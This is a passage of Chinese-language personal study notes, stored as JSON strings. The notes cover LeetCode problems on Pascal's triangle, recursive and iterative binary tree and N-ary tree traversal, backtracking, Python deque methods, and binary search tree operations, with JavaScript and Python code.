`const`\n\n## 5. [杨辉三角 II](https://leetcode.cn/problems/pascals-triangle-ii/)\n\n### 5.1. 原题\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/1bcf1cf7d1e9231244aacfa62a57cc7b.png)\n\n### 5.2. 动图\n![杨辉三.gif|260](https://832-1310531898.cos.ap-beijing.myqcloud.com/3f73439dad01856d8858eb21255f9a73.gif)\n\n### 5.3. 错误记录\n\n- 技巧：可以尝试运行，看看输出结果和实际结果，能够很快的判断错误原因，如下图：\n\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/dc6d0548ca99f255ea2d96e94be092bb.png)\n\n### 5.4. 代码\n\n```javascript\n/**\n * @param {number} rowIndex\n * @return {number[]}\n */\n// ::::① 定义，返回第rowIndex行的数组，并且相信它\nvar getRow = function (rowIndex) {\n    \n    // ::::第一个元素是1\n    let row = [1];\n    \n    // ::::② base case\n    if (rowIndex === 0) {\n        return row;\n    }\n    // ::::::③ 递归调用，新得到上一行的数组\n    const preRow = getRow(rowIndex - 1);\n    for (let i = 0; i < rowIndex - 1; i++) {\n        const value = preRow[i] + preRow[i + 1];\n        row.push(value)\n    }\n    // :::: 最后一个元素是1\n    row.push(1);\n    return row;\n};\n```\n\n- 这题，不是二叉树问题，但旨在说明：`相信递归函数的重要性`\n\n## 6. [杨辉三角](https://leetcode.cn/problems/pascals-triangle/)\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/04e8fb0d64df44af6b62aeb027df12d1.png)\n\n```javascript\n/**\n * @param {number} numRows\n * @return {number[][]}\n */\nvar generate = function (numRows) {\n    // ::::base case\n    let res = [];\n    if (numRows < 1) {\n        return res;\n    }\n\n    // ::::base case： 第一行\n    let firstRow = [1];\n    res.push(firstRow);\n\n    // ::::// 开始一层一层生成，装入 res\n    for (let i = 2; i <= numRows; i++) {\n        let preRow = res[res.length - 1];\n        res.push(generateNext(preRow));\n    }\n\n    return res;\n};\n\n/**\n * @description 生成下一行的数组\n * @param {Array} row 上一行的数组\n * */\nvar generateNext = function (row) {\n    // ::::注意，是 [1] 不是 【0】，搞了半天\n    const res = [1];\n    for (let i = 0; i < row.length - 1; i++) {\n        res.push(row[i] + row[i + 1]);\n    }\n    // ::::注意，是 [1] 不是 【0】，搞了半天\n    res.push(1);\n    return res;\n}\n\n```\n\n- ①  这个题不是二叉树题目，刷到就随便刷了\n- ②  关键是辅助函数的定义 `generateNext` ，一定要`明确好这个函数的定义`\n- ③  注意📢📢📢📢📢： **是` [1] `不是 `[0]`，搞了半天**\n\n## 7. [二叉树的前后中序遍历](https://leetcode.cn/problems/binary-tree-preorder-traversal/)：`分解问题思路`\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar preorderTraversal = function (root) {\n    let res = [];\n\n    // ::::base case\n    if (root === null) {\n        return res;\n    }\n    \n    // ::::::前序位置\n    res.push(root.val);\n  \n    res.push(...preorderTraversal(root.left));\n  \n    // ::::::::中序位置\n  \n    res.push(...preorderTraversal(root.right));\n  \n    // ::::::::后序位置\n\n    return res;\n};\n\n```\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/03c32810019d84ba92f3716adff11a24.png)\n\n① 这也解释了上图：为什么前后遍历，root 在第一个？因为对应代码位置！\n② 其他`中序遍历`和`后序遍历` 只需要改变一下顺序\n③ 简写，使用`...` ,注意格式：`res.push(...preorderTraversal(root.right));`\n- 不是 `res.push([...preorderTraversal(root.right)])`\n\n","bUxTVafy":"\n# 二叉树的前中后序遍历详解\n\n\n\n## 目录\n<!-- toc -->\n ## 1. `递归函数` 可以理解为一个 `指针` \n\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/45f717821f91cf547c060bc79a4b7a44.png)\n\n## 2. 函数递归顺序是不会变的\n\n**无论哪种遍历方式，函数递归顺序是不会变的**，都是按以下顺序（数字大小代表顺序）遍历，如下图：\n\n![image.png|472](https://832-1310531898.cos.ap-beijing.myqcloud.com/80e97494c5f738af6f0ff737c88a291a.png)\n\n## 3. 前后中序遍历代表三个不同的`时机`\n\n![image.png|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/1c30d9714e7be8b4b354eb5e4e5ebbbd.png)\n\n## 4. 应用：看下图，分别说出`前后中序`的顺序\n\n> 按照 递归函数的调用顺序，遇到`具体颜色`，说出数字即可\n\n![image.png|520](https://832-1310531898.cos.ap-beijing.myqcloud.com/b8eb14ec81e03af7442b8a5b379e31a7.png)\n\n## 5. 应用：根据前中序 `推导出` 原二叉树结构\n\n![image.png|496](https://832-1310531898.cos.ap-beijing.myqcloud.com/ce4a61f186407fa571eaee9f46ea3a32.png)\n\n> - **至少需要根据遍历特性，写出来，纸笔推导出来**\n\n## 6. 应用：计算二叉树的`节点个数`\n\n![image.png|456](https://832-1310531898.cos.ap-beijing.myqcloud.com/51595d1db617d6bb546c0745d43bafa3.png)\n\n## 7. 应用：让二叉树每个节点值 `+1`\n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/444d2b0ff7d0723150d4ff54422b4c76.png)\n\n## 8. 总结\n\n- `递归函数` 可以理解为一个 `指针`\n- `递归顺序`是不会变的\n- `前后中序`是三个不同的`时间点` 或 `时机`\n\n","3B6xeFvr":"\n# 二叉树的遍历思路习题\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 二叉树的最小深度 \n\n![image.png|520](https://832-1310531898.cos.ap-beijing.myqcloud.com/a8e427b4d5934c36edd8b1ab20fb9667.png)\n\n### 1.1. 使用`遍历`的思路题解\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number}\n */\nvar minDepth = function(root) {\n  // ::::初始值\n  let res = Infinity;\n  // ::::深度\n  let depth = 0;\n  // ::::少了这段代码，所以报错\n  // 如果根节点为 null，则直接返回 0\n  if (root === null) return 0;\n  function traverse(root) {\n    // ::::base case\n    // ::::问，返回什么？什么也不返回\n    if(root === null) return;\n    // ::::错误，之前的写法\n    // if(root === null) return res;\n    // ::::前序位置\n    depth++;\n    // ::::如果到达叶子节点，更新res\n    if(root.left === null && root.right === null) {\n      res = Math.min(res, depth);\n    }\n    traverse(root.left);\n    // ::::中序位置\n    traverse(root.right);\n    // ::::后序位置\n    depth--;\n  }\n  traverse(root);\n  // return res;  这个必须要判断，否则会报错，有可能就是 Infinity\n  // 之前写错了这个\n  // 如果树不为空但没有叶子节点（只有一个根节点），则最小深度为 1\n  return res === Infinity ? 1 : res;\n};\n\n```\n\n- 这个题还有其他的解法，比如`层次遍历`，这个放到后面再研究\n- 如果 `Infinity`不不好拼写，就使用 `Math.min()`\n    - 注意是 `Math.min()`，反过来的\n    - 当然，还有一种思路是，**看题设的最大值是多少，那就用多少**\n\n## 2. [二叉树的前序遍历](https://leetcode.cn/problems/binary-tree-preorder-traversal/)\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar preorderTraversal = function(root) {\n    // ::::返回的结果\n    const res = [];\n    \n    function traverse(root){\n        // ::::base case, 递归结束的条件\n        if(root === null) {\n            return;\n        }\n        // ::::前序位置\n        res.push(root.val);\n        traverse(root.left);\n        // :::::中序位置\n        traverse(root.right);\n        // :::::后序位置\n    }\n    traverse(root);\n    return res;\n};\n```\n\n## 3. 二叉树的中序遍历\n\n> [https://leetcode.cn/problems/binary-tree-inorder-traversal/submissions/509462582/](https://leetcode.cn/problems/binary-tree-inorder-traversal/submissions/509462582/)\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar inorderTraversal = function(root) {\n    // ::::返回的结果\n    const res = [];\n\n    function traverse(root){\n        // ::::base case, 递归结束的条件\n        if(root === null) {\n            return;\n        }\n        // ::::前序位置\n\n        traverse(root.left);\n        // :::::中序位置\n        res.push(root.val);\n      \n        traverse(root.right);\n        // :::::后序位置\n    }\n    traverse(root);\n    return res;\n};\n```\n\n## 4. 二叉树的后续遍历\n\n>  [https://leetcode.cn/problems/binary-tree-postorder-traversal/](https://leetcode.cn/problems/binary-tree-postorder-traversal/)\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar postorderTraversal = function(root) {\n    // ::::返回的结果\n    const res = [];\n\n    function traverse(root){\n        // ::::base case, 递归结束的条件\n        if(root === null) {\n            return;\n        }\n        // ::::前序位置\n        traverse(root.left);\n        // :::::中序位置\n      \n        traverse(root.right);\n        // :::::后序位置\n\n        res.push(root.val);\n    }\n    traverse(root);\n    return res;\n};\n\n```\n\n## 5. [N 叉树的前序遍历](https://leetcode.cn/problems/n-ary-tree-preorder-traversal/)\n\n```javascript\n\n/**\n * @param {Node|null} root\n * @return {number[]}\n */\nvar preorder = function(root) {\n    const res = [];\n    function traverse(root){\n        if(root === null){\n            return;\n        }\n        // ::::::前序位置\n        res.push(root.val);\n        // ::::使用for...of循环遍历数组\n        for(let item of root.children){\n            traverse(item);\n        }\n        // ::::::后序位置\n    }\n    traverse(root);\n    return res;\n};\n```\n\n- 多叉树没有`中序遍历` ，因为没有固定的`中序位置`\n- 注意，使用 `for-of` 来遍历 `root.children` ，方便书写\n\n`如果放到 for 循环里面，会怎么样`，看下面代码：\n\n```javascript\n\n/**\n * @param {Node|null} root\n * @return {number[]}\n */\nvar preorder = function(root) {\n    const res = [];\n    function traverse(root){\n        if(root === null){\n            return;\n        }\n        // ::::::前序位置\n        // ::::使用for...of循环遍历数组\n        for(let item of root.children){\n            // :::: 如果放到 for 循环里面，其实这就是回溯算法\n            // :::: 但这里遍历不会包含根节点\n            res.push(root.val);\n            traverse(item);\n        }\n        // ::::::后序位置\n    }\n    traverse(root);\n    return res;\n};\n```\n\n> 这里遍历不会包含`根节点`\n\n## 6. 根据传入的值 `n`，生成所有 `小于 n` 的二进制\n\n### 6.1. 分析：转化成`多叉树遍历`问题\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/e80454be7e5ee8b8f530f525cf64a6c9.png)\n\n- 二进制，就是`二叉树` 嘛\n- 十进制，就是 `十叉树` 嘛\n- 这其实是一个`回溯算法` ，所以前后序位置，放到 `for 循环` 里面\n    - 然后，在前后序位置，做`选择`或者`撤销选择`\n\n### 6.2. 代码：使用`回溯算法框架`实现\n\n```javascript\n/**\n * @description 根据输入的数字 n，返回所有小于这个数 n 的 二进制数\n * */\nfunction generateBinaray(n) {\n    // ::::结果集\n    const res = [];\n    // ::::路径\n    const path = [];\n    function backtrack(n) {\n        // ::::到达叶子结点了\n        if (n === 0) {\n            console.log(path);\n            // ::::::这里需要深拷贝一下，否则会出现引用问题,因为path是引用类型\n            res.push(JSON.parse(JSON.stringify(path)));\n            return;\n        }\n\n        // ::::回溯算法的遍历框架\n        // ::::二进制，所以这里是 0 和 1， 即 i<2 即可\n        for (let i = 0; i < 2; i++) {\n\n            // ::::选择\n            // ::::前序遍历，进入节点\n            path.push(i);\n\n            // :::::递归\n            backtrack(n - 1);\n\n            // ::::撤销选择\n            // ::::后续遍历，离开节点\n            path.pop();\n        }\n    }\n    backtrack(n);\n\n    console.log(res);\n    return res;\n}\n\ngenerateBinaray(3);\n\ngenerateBinaray(10);\n\n```\n\n- 满足条件时，**一定要深拷贝，一定要深拷贝，一定要深拷贝**\n- 需要生成其他进制的数，更改 `for 循环`的里的数即可，即`多 **叉数` **对应 `多少 **进制`\n    - `二进制` 对应 `2 叉树` \n    - `十进制` 对应 `10 叉树` \n    - `八进制` 对应 `8 叉树`\n- 输入的别太大，否则很容易`爆了`\n\n## 7. [N 叉树的后序遍历](https://leetcode.cn/problems/n-ary-tree-postorder-traversal/)\n```javascript\n\n/**\n * @param {Node|null} root\n * @return {number[]}\n */\nvar postorder = function(root) {\n    const res = [];\n    function traverse(root){\n        if(root === null){\n            return;\n        }\n        /*************************************************\n         * ::::前序位置\n         ************************************************/\n        // ::::使用for...of循环遍历数组\n        for(let item of root.children){\n            traverse(item);\n        }\n        /*************************************************\n         * ::::后序位置\n         ************************************************/\n        res.push(root.val);\n    }\n    traverse(root);\n    return res;\n};\n```\n\n## 8. [N 叉树的最大深度](https://leetcode.cn/problems/maximum-depth-of-n-ary-tree/)\n\n```javascript\n/**\n * @param {Node|null} root\n * @return {number}\n */\nvar maxDepth = function (root) {\n    // ::::返回的结果\n    let res = 0;\n    // ::::递归的深度,初始化为0\n    let depth = 0;\n\n    function traverse(root) {\n        // ::::::base case\n        if (root === null) {\n            return;\n        }\n        /*************************************************\n         * ::::::前序位置\n         ************************************************/\n        depth++;\n        res = Math.max(depth, res);\n        for (item of root.children) {\n            traverse(item);\n        }\n        /*************************************************\n         * ::::::::后序位置\n         ************************************************/\n        depth--;\n    }\n    \n    traverse(root);\n    \n    return res;\n};\n```\n\n- 如果 `Infinity`不不好拼写，就使用 `Math.min()`\n    - 注意是 `Math.min()`，反过来的\n\n","zxGqDn4o":"\n# 二叉树遍历的迭代解法\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 使用 `栈` 来模拟 `递归调用` \n\n```javascript\n/**\n * @description 二叉树遍历递归解法\n * */\n\n// 使用栈来模拟递归的调用\nconst stack = [];\n\nfunction traverse(root) {\n\n    if (root === null) {\n        return;\n    }\n\n    // ::::::前序位置\n    stack.push(root);\n    traverse(root.left);\n\n    // ::::::中序位置\n    traverse(root.right);\n\n    // ::::::后序位置\n    stack.pop();\n\n    return stack;\n}\n```\n\n> - 上面代码清晰，好理解\n> - 但 **如果将上面的递归解法，改成迭代解法呢？**\n\n## 2. [ 二叉树的前序遍历](https://leetcode.cn/problems/binary-tree-preorder-traversal/)\n```javascript\n\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar preorderTraversal = function (root) {\n\n    // ::::如果根节点为空，直接返回空数组\n    if (root === null) return [];\n\n    // ::::::返回的结果\n    let res = [];\n\n    // ::::::::辅助栈,默认放入根节点\n    const stack = [root];\n\n    // ::::::::迭代\n    while (stack.length) {\n        \n        // :::::弹出栈顶元素\n        const node = stack.pop();\n        \n        // ::::前序位置\n        res.push(node.val);\n\n        /*************************************************\n         * :::::右节点先入栈，左节点后入栈,保证左子树先遍历\n         ************************************************/\n        if (node.right) {\n            stack.push(node.right);\n        }\n        if (node.left){\n            stack.push(node.left);\n        }\n    }\n\n    return res;\n};\n\n```\n\n两个重点说明：\n- 这里有确定的 `前序位置` ，如上代码 `30` 行，这个时候 `res.push()`\n\t- 但 `其他位置` ，并不确定\n\t- 真正遍历不可能这么搞，递归调用即可，不用这么麻烦，还不理解\n- **右节点先入栈，左节点后入栈，保证左子树先遍历**\n\n## 3. [二叉树的中序遍历](https://leetcode.cn/problems/binary-tree-inorder-traversal/)\n```javascript\n\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar inorderTraversal = function(root) {\n    // ::::返回的结果\n    const res = [];\n\n    // ::::::::辅助栈\n    const stack = [];\n\n    // ::::::::迭代\n    while (root || stack.length) {\n        \n        // :::::左节点全部入栈,直到没有左节点\n        while (root) {\n            stack.push(root);\n            root = root.left;\n        }\n        \n        /*************************************************\n         * ::::::::中序位置,只有在弹出栈顶元素的时候才会访问\n         ************************************************/\n        // :::::弹出栈顶元素\n        root = stack.pop();\n        res.push(root.val);\n\n        // :::::右节点\n        root = root.right;\n    }\n    return res;\n};\n\n```\n\n> - 只有`中序位置` 是确定的，其他没试过\n> - 左侧节点，需要全部入栈，然后才是根节点，然后再试右节点，这里都使用一个变量 `root` 来维护，标识当前遍历的 `子节点的根节点`\n\n## 4. [ 二叉树的后序遍历](https://leetcode.cn/problems/binary-tree-postorder-traversal/)\n```javascript\n/**\n * Definition for a binary tree node.\n * function TreeNode(val, left, right) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.left = (left===undefined ? null : left)\n *     this.right = (right===undefined ? null : right)\n * }\n */\n/**\n * @param {TreeNode} root\n * @return {number[]}\n */\nvar postorderTraversal = function (root) {\n\n    if (root === null) return [];\n\n    // ::::返回的结果\n    const res = [];\n\n    // ::::::::辅助栈\n    const stack = [root];\n\n    while (stack.length) {\n        const node = stack.pop();\n        // ::::【逆序】添加节点值\n        res.unshift(node.val);\n        /*************************************************\n         * ::::::::左节点先入栈，右节点后入栈, 保证右子树先遍历\n         ************************************************/\n        if (node.left) {\n            stack.push(node.left);\n        }\n        if (node.right) {\n            stack.push(node.right);\n        }\n    }\n\n    return res;\n};\n\n```\n\n> - 这里根本没有什么`后序位置`吧？只是为了遍历而遍历，使用` unshift` 的能力\n> - 左节点先入栈，右节点后入栈, 保证右子树先遍历\n\n## 5. 二叉树遍历的`迭代模板`\n\n### 5.1. 代码\n> - 请注意以下前中后序的 `位置`\n> - 注意下面的图示，根据图来理解代码为什么这么写\n> - 一般来讲，有空就去了解吧\n\n```javascript\n// 使用栈来模拟递归的调用\nconst stack = [];\n// 左侧节点入栈，一直到左侧节点为空\nfunction pushLeftBranch(p) {\n    while (p) {\n        /*************************************************\n         * ::::前序位置，进入一个节点时，就把它放入栈中\n         ************************************************/\n        stack.push(p);\n        p = p.left;\n    }\n}\n\nfunction traverse(root) {\n    // ::::指向上一次遍历完的根节点\n    let visited = new TreeNode(-1);\n    // ::::开始遍历整个树\n    pushLeftBranch(root);\n    while (stack.length) {\n        // 取出栈顶元素，但不出栈\n        const p = stack[stack.length - 1];\n        // p 的左侧节点已经全部入栈 或者 上次遍历完的根节点是 p 的左侧节点\n        // 并且 p 的右侧节点还没有遍历\n        if ((p.left === null || p.left === visited)\n            && p.right !== visited) {\n            /*************************************************\n             * ::::::::中序位置\n             ************************************************/\n            pushLeftBranch(p.right);\n        }\n        // ::::p的右侧节点已经遍历完了，或者p的右侧节点是上次遍历完的根节点\n        if (p.right === null || p.right === visited) {\n            /*************************************************\n             * ::::::::后序位置\n             ************************************************/\n            visited = stack.pop();\n        }\n    }\n}\n\n```\n\n### 5.2. 画图\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/fa209ce75d2943a79a4a46f958810e17.png)\n\n","Lx14BVhJ":"\n# 二叉树的遍历（Python 描述）\n\n`#二叉树` `#遍历`\n\n\n## 目录\n<!-- toc -->\n ## 1. 层次遍历 \n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922184805.png)\n\n```python\n# 二叉树的层次遍历\n\nfrom collections import deque\n\nclass TreeNode:\n    def __init__(self, val):\n        self.val = val\n        self.left:TreeNode | None = None\n        self.right:TreeNode | None = None\n\ndef level_order(root: TreeNode | None) -> list[int]:\n    \"\"\"层序遍历\"\"\"\n    # base case\n    if root is None:\n        return []\n    # 初始化队列，加入根节点\n    queue: deque[TreeNode] = deque()\n    queue.append(root)\n    # 初始化一个列表，用于保存遍历序列\n    res = []\n    while queue:\n        node: TreeNode = queue.popleft()  # 队列出队\n        res.append(node.val)  # 保存节点值\n        if node.left is not None:\n            queue.append(node.left)  # 左子节点入队\n        if node.right is not None:\n            queue.append(node.right)  # 右子节点入队\n    return res\n```\n\n## 2. 前后中序遍历\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922184904.png)\n\n```python\n# 二叉树的层次遍历\nfrom collections import deque\n\nclass TreeNode:\n    def __init__(self, val):\n        self.val = val\n        self.left:TreeNode | None = None\n        self.right:TreeNode | None = None\n\ndef pre_order(root: TreeNode | None) -> list[int]:\n    \"\"\"前序遍历\"\"\"\n    if root is None:\n        return []\n    res = []\n    res.append(root.val)\n    # 以上是前序遍历的位置\n    res.extend(pre_order(root.left))\n    res.extend(pre_order(root.right))\n    return res\n\ndef in_order(root: TreeNode | None) -> list[int]:\n    \"\"\"中序遍历\"\"\"\n    if root is None:\n        return []\n    res = []\n    res.extend(in_order(root.left))\n    res.append(root.val)\n    res.extend(in_order(root.right))\n    return res\n\ndef post_order(root: TreeNode | None) -> list[int]:\n    \"\"\"后序遍历\"\"\"\n    if root is None:\n        return []\n    res = []\n    res.extend(post_order(root.left))\n    res.extend(post_order(root.right))\n    res.append(root.val)\n    return res\n```\n\n\n## 3. 附：Python 中 deque（双端队列）的 `extend()` 和 `append()`  的区别\n\nPython 中 deque（双端队列）的 `extend()` 和 `append()` 方法虽然都用于添加元素，但它们在使用方式和效果上有一些重要的区别。让我们详细比较这两个方法：\n\n### 3.1. 定义\n\n1. append() 方法\n\t- 作用：在 deque 的右端（末尾）添加一个元素。\n\t- 参数：接受一个单一元素作为参数。\n\t- 时间复杂度：O(1)，常数时间操作。\n2. extend() 方法\n\t- 作用：在 deque 的右端（末尾）添加多个元素。\n\t- 参数：接受一个可迭代对象（如**列表、元组、字符串**等）作为参数。\n\t- 时间复杂度：O(k)，其中 k 是被添加的元素数量。\n\n让我们通过一些示例来说明它们的区别：\n\n```python\nfrom collections import deque\n\n# 创建一个 deque\nd = deque([1, 2, 3])\n\n# 使用 append()\nd.append(4)\nprint(d)  # 输出: deque([1, 2, 3, 4])\n\n# 使用 extend()\nd.extend([5, 6, 7])\nprint(d)  # 输出: deque([1, 2, 3, 4, 5, 6, 7])\n\n# append() 添加一个列表作为单一元素\nd.append([8, 9])\nprint(d)  # 输出: deque([1, 2, 3, 4, 5, 6, 7, [8, 9]])\n\n# extend() 使用字符串\nd.extend(\"abc\")\nprint(d)  # 输出: deque([1, 2, 3, 4, 5, 6, 7, [8, 9], 'a', 'b', 'c'])\n```\n\n### 3.2. 主要区别\n\n1. 添加的元素数量：\n\t- `append()` 每次只添加一个元素。\n\t- `extend()` 可以一次添加多个元素。\n2. 参数类型：\n\t- `append()` 将其参数作为单一元素添加，即使该参数是一个可迭代对象。\n\t- `extend()` 接受一个可迭代对象，并将其中的每个元素单独添加到 deque 中。\n3. 处理可迭代对象：\n\t- 如果你用 `extend()` 添加一个列表，列表中的每个元素会被单独添加。\n\t- 如果你用 `append()` 添加一个列表，整个列表会作为一个元素被添加。\n4. **字符串**处理：\n\t- `extend()` 会将字符串中的每个字符作为单独的元素添加。\n\t- `append()` 会将整个字符串作为一个元素添加。\n5. 性能考虑：\n\t- 对于添加多个元素，`extend()` 通常更高效，因为它避免了多次调用 `append()`。\n\t- 对于添加单个元素，`append()` 通常更高效。\n6. 左侧操作：\n\t- 注意，`extendleft()` 会反转添加的元素顺序。\n\t- deque 还提供了 `appendleft()` 和 `extendleft()` 方法，它们在左侧（开头）执行相应的操作。\n\n示例：\n\n```python\nd = deque([1, 2, 3])\nd.appendleft(0)\nprint(d)  # 输出: deque([0, 1, 2, 3])\n\nd.extendleft([4, 5, 6])\nprint(d)  # 输出: deque([6, 5, 4, 0, 1, 2, 3])\n```\n\n总结：\n- 使用 `append()` 当你想添加单个元素时。\n- 使用 `extend()` 当你想添加多个元素，或者处理可迭代对象中的每个元素时。\n- 理解这两个方法的区别可以帮助你更有效地使用 deque，并在适当的场景选择正确的方法。\n","WtnxJExL":"\n# 二叉搜索树（篇二：BST 的增删改查）\n\n\n`#BST` `#leetcode`  `#二叉树/二叉搜索树`   `#2024/09/08` \n\n\n## 目录\n<!-- toc -->\n ## 1. 代码模板 \n\n```javascript\nvar BST = function (root, target) {\n  if (root.val === target) {\n    // 找到目标，做点什么\n  }\n  if (root.val < target) {\n    BST(root.right, target);\n  }\n  if (root.val > target) {\n    BST(root.left, target);\n  }\n};\n```\n\n## 2. 判断 BST 的合法性\n\n- 对于每一个节点 `root`，代码值检查了它的左右孩子节点是否符合左小右大的原则\n- 最重要的是，还需要检查 **`root` 的整个左子树都要小于 `root.val`，整个右子树都要大于 `root.val`**\n\n否则规避下面的情况：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908120714.png)\n\n所以，需要需要在递归函数中**传值** ，具体代码如下：\n\n```javascript hl:18\nvar isValidBST = function (root) {\n  return _isValidBST(root, Number.MIN_SAFE_INTEGER, Number.MAX_SAFE_INTEGER);\n};\n\n/**\n * @description 判断一棵树是否是二叉搜索树\n * @param {TreeNode} root 二叉树根节点\n * @param {number} min 代表 root.val 的下界\n * @param {number} max 代表 root.val 的上界\n * @return {boolean} 是否是二叉搜索树\n */\nvar _isValidBST = function (root, min, max) {\n  // base case: root 为 null 时，是二叉搜索树\n  if (root === null) {\n    return true;\n  }\n  // 若 root.val 不符合 min < root.val < max，说明不是二叉搜索树\n  if (root.val <= min || root.val >= max) {\n    return false;\n  }\n\n  // 递归判断左右子树是否是二叉搜索树\n  // 左子树的最大值为 root.val, 最小值为 min\n  let left = _isValidBST(root.left, min, root.val);\n  // 右子树的最小值为 root.val, 最大值为 max\n  let right = _isValidBST(root.right, root.val, max);\n\n  return left && right;\n};\n\n```\n\n### 2.1. 注意点\n\n上面代码的 18 行中，需要注意使用 `>=`，还有一些注意点如下图：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908122150.png)\n\n## 3. 在 BST 中搜索一个节点 \n\n### 3.1. 遍历一遍找到目标节点\n\n```javascript\nvar searchBST = function (root, target) {\n  if (root === null) {\n    return null;\n  }\n  // base case: root 为 null 时，返回 null\n  if (root.val === target) {\n    return root;\n  }\n  // 左子树中搜索\n  let left = searchBST(root.left, target);\n  if (left) {\n    return left;\n  }\n  // 右子树中搜索\n  let right = searchBST(root.right, target);\n  if (right) {\n    return right;\n  }\n  // 没有找到目标值\n  return null;\n};\n\n```\n\n### 3.2. 利用 BST 的左小右大的特性\n\n```javascript\nvar searchBST = function (root, target) {\n  if (root === null) {\n    return null;\n  }\n  // base case: root 为 null 时，返回 null\n  if (root.val === target) {\n    return root;\n  }\n  // 如果目标值小于当前节点值，搜索左子树\n  if (target < root.val) {\n    return searchBST(root.left, target);\n  }\n  // 如果目标值大于当前节点值，搜索右子树\n  if (target > root.val) {\n    return searchBST(root.right, target);\n  }\n  return null;\n};\n\n```\n\n## 4. 在 BST 中插入一个节点 \n\n> 我们假定 **默认不会向 BST 中插入已存在的值**\n\n```javascript\nfunction insertIntoBST(root, val) {\n  //如果根节点为空，直接返回一个新节点，值为 val\n  if (!root) {\n    return new TreeNode(val);\n  }\n  //如果 val 大于当前节点的值，递归插入到右子树\n  if (root.val < val) {\n    root.right = insertIntoBST(root.right, val);\n  }\n  //如果 val 小于当前节点的值，递归插入到左子树\n  if (root.val > val) {\n    root.left = insertIntoBST(root.left, val);\n  }\n  // 最后，返回根节点\n  return root;\n}\n\n```\n\n### 4.1. 注意点\n\n- 一旦涉及**改**，就**类似二叉树的构造问题**，函数要返回 `TreeNode` 类型\n- 并且要对递归调用的**返回值**进行**接收**\n\n## 5. 在 BST 中删除一个节点 \n\n- 先「找」该节点\n- 再「改」该节点\n\n### 5.1. 先写出代码模板\n\n```javascript hl:3\nvar deleteNode = function(root, key) {\n    if (root.val === key) {\n        // 找到啦， 进行删除\n    } else if (root.val > key) {\n        // 去左子树找\n        root.left = deleteNode(root.left, key);\n    } else if (root.val < key) {\n        // 去右子树找\n        root.right = deleteNode(root.right, key);\n    }\n    return root;\n}\n```\n\n### 5.2. 找到了，有三种情况\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908125438.png)\n\n### 5.3. 代码实现\n\n```javascript\nvar deleteNode = function (root, key) {\n  // base case\n  if (!root) {\n    return null;\n  }\n  if (root.val === key) {\n    // 情况 1：没有子节点, 直接删除\n    //  删除的方式是：直接返回 null\n    if (!root.left && !root.right) {\n      return null;\n    }\n\n    // 情况 2：只有一个子节点\n    // 删除的方式是：返回非空的子节点\n    // 如果右子节点存在，返回右子节点\n    // 删除的方式是：返回右子节点\n    if (!root.left && root.right) {\n      return root.right;\n    }\n    // 如果左子节点存在，返回左子节点\n    // 删除的方式是：返回左子节点\n    if (!root.right && root.left) {\n      return root.left;\n    }\n\n    // 情况 3：有两个子节点\n    // 删除的方式是：① 找到右子树中的最小节点，替换当前节点 或者 ② 找到左子树中的最大节点，替换当前节点\n    // 我们这里选择 ①\n    // 找到右子树中的最小节点, 替换当前节点, 然后删除右子树中的最小节点\n    // ① - 1:找到右子树中的最小节点\n    let minNode = getMin(root.right);\n    // ① - 2:替换当前节点\n    root.val = minNode.val;\n    // ① - 3:然后删除右子树中的最小节点,返回值必须使用 root.right 接住\n    root.right = deleteNode(root.right, minNode.val);\n  } else if (root.val > key) {\n    // 去左子树找\n    root.left = deleteNode(root.left, key);\n  } else if (root.val < key) {\n    // 去右子树找\n    root.right = deleteNode(root.right, key);\n  }\n  return root;\n};\n// 获得 BST 中最小的节点。\nvar getMin = function (node) {\n  // BST 最左边的就是最小的\n  while (node.left != null) {\n    node = node.left;\n  }\n  return node;\n};\n\n```\n\n## 6. 最后注意 📢\n\n仅对于这道算法题来说是可以的，但这样操作并不完美，我们一般不会通过修改节点内部的值来交换节点。因为在实际应用中，BST 节点内部的数据域是用户自定义的，可以非常复杂，而 BST 作为数据结构（一个工具人），其操作应该和内部存储的数据域解耦，所以我们更倾向于使用指针操作来交换节点，根本没必要关心内部数据。\n\n1. 如果当前节点会对下面的子节点有整体影响，可以通过借助**函数传参**\n2. 递归**修改**数据结构时\n\t- **一定要对递归调用的返回值进行接收**\n\t- 并**返回**修改后的节点\n3.  BST 作为数据结构（一个工具人），同递归，没必要关心里面，只需要在每个节点做直接应该做的事情即可，递归会帮你完成\n\n## 7. 参考\n\nhttps://labuladong.online/algo/data-structure/bst-part2/\n\n## 8. 相关题目\n\n|LeetCode|力扣|难度|\n|---|---|---|\n|[450. Delete Node in a BST](https://leetcode.com/problems/delete-node-in-a-bst/)|[450. 删除二叉搜索树中的节点](https://leetcode.cn/problems/delete-node-in-a-bst/)|🟠|\n|[700. Search in a Binary Search Tree](https://leetcode.com/problems/search-in-a-binary-search-tree/)|[700. 